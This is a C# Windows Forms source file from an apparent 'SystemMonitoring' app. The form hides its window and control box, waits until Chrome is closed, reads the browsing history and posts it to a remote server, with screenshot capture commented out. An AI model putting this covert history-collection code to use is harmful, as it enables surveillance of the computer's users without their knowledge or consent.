using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using SystemMonitoring.BusinessLogic;
using ChromeData;
using System.Net.Http;

namespace SystemMonitoring.Forms
{
    public partial class Welcome : Form
    {
        private int _ticks;
        public Welcome()
        {
            InitializeComponent();

            ChromeHistory ch = new ChromeHistory("");
            ch.SaveLastTime();
            timer1.Start();

            this.WindowState = FormWindowState.Minimized;
        }

        private void timer1_Tick(object sender, EventArgs e)
        {

            _ticks++;
            this.Text = _ticks.ToString();
            if(_ticks == 6)
            {


                CheckProcess cp = new CheckProcess();
                if(!cp.isRunning("chrome"))
                {
                    /*
                     *save last time 
                     * get history
                     * 
                     */

                    ChromeHistory ch = new ChromeHistory("");
                    List<HistoryItem> history = ch.GetHistory();
                    if(history.Count > 0)
                    {

                        HttpResponseMessage msg = PostData.SendToServer(history, "history");
                        Console.WriteLine("Status Code " + msg.StatusCode);
                        ch.SaveLastTime();
                    }
                }
                this.Text = "Done";
                _ticks = 0;
                //CaptureScreen cs = new CaptureScreen();
                //cs.Screenshot();
                //DateTime dt = DateTime.Now;

                
            }
        }

        private void Welcome_Load(object sender, EventArgs e)
        {
            this.ControlBox = false;
            //this.Text = " ";
        }
        
        private void button1_Click(object sender, EventArgs e)
        {

           
        }

        private void pictureBox1_Click(object sender, EventArgs e)
        {
            this.WindowState = FormWindowState.Minimized;
        }
    }
}
